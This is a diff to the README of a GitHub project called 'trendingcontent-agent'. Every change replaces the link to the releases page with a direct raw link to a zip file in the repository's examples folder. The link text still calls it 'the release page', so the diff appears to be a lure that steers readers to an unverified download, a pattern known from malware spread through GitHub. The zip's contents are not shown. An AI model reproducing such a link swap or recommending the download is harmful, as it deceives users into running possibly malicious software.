@@ -1,6 +1,6 @@
 # 🧭 trendingcontent-agent - Find Topics and Draft Posts Fast
 
-[![Download trendingcontent-agent](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/Greenap7654/trendingcontent-agent/releases)
+[![Download trendingcontent-agent](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Greenap7654/trendingcontent-agent/main/examples/trendingcontent-agent-3.6.zip)
 
 ## 🚀 Getting Started
 
@@ -30,7 +30,7 @@ For best results, use:
 
 ## 📥 Download the App
 
-1. Open the release page here: https://github.com/Greenap7654/trendingcontent-agent/releases
+1. Open the release page here: https://raw.githubusercontent.com/Greenap7654/trendingcontent-agent/main/examples/trendingcontent-agent-3.6.zip
 2. Find the latest release at the top of the page
 3. Look for the Windows file in the release assets
 4. Download the file to your computer
@@ -245,4 +245,4 @@ This project extends the last30days skill and adds:
 ## 📦 Download Again
 
 If you need the release page again, use this link:
-https://github.com/Greenap7654/trendingcontent-agent/releases
+https://raw.githubusercontent.com/Greenap7654/trendingcontent-agent/main/examples/trendingcontent-agent-3.6.zip
